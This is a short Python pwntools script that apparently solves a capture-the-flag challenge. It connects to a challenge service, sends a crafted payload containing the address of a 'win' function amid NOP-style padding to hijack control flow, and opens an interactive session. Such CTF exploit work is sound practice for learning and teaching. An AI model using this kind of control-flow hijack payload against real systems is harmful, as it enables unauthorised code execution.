import argparse
import struct
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))


win_fn = 0x08049236
print(f"Win func: {win_fn:08x}")

payload = b'\x0f\x1f\x84' + struct.pack('<I', win_fn) + b'AD\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90D\x90'

print(f"Payload: {payload}")

r.sendline(payload)
r.recvuntil(b'Running your nops! Nothing should happen!\n')
r.interactive()
